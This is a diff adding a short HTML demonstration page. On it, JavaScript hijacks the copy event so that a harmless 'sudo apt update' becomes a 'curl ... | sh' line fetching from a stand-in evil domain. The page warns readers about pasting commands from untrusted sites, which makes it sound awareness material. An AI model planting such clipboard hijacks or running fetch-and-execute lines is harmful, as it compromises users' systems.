@@ -1,0 +1,40 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>Copypasta magic</title>
+    <script>
+      // Copy rewrite
+      window.onload=function(){
+	  document.getElementById('copyhijack').addEventListener('copy', function(e) {
+	      e.preventDefault();
+	      e.clipboardData.setData('text/plain', 'curl http://evil.domain/paste-exploit | sh\n');
+	  });
+      }
+    </script>
+  </head>
+  <body>
+    <div class="main_page">
+      <h1>Copy/paste fun</h1>
+      <div>Javascript hijacks the copy command and rewrites the text with something malicious if pasted into a terminal window</div>
+      <div style="font-weight: bold;">Dont copy paste commands from strange websites, especially as admin</div>
+      
+      <h2>Copy this</h2>
+      <span id="copyhijack" style="background-color: #f8f8f8;">
+	<code>sudo apt update</code>
+      </span>
+      <h2>Paste it here</h2>
+      <textarea style="height: 200px; min-height: 150px; resize: none;" cols="50" name="textarea" rows="5" placeholder="Paste text here..."></textarea>
+      <h2>The code</h2>
+      <span style="background-color: #f8f8f8;">
+	<code>
+	  document.getElementById('copyhijack').addEventListener('copy', function(e) {
+	      e.preventDefault();
+	      e.clipboardData.setData('text/plain', 'curl http://evil.domain/paste-exploit | sh\n');
+	  });
+	</code>
+      </span>
+      
+  </body>
+</html>
+
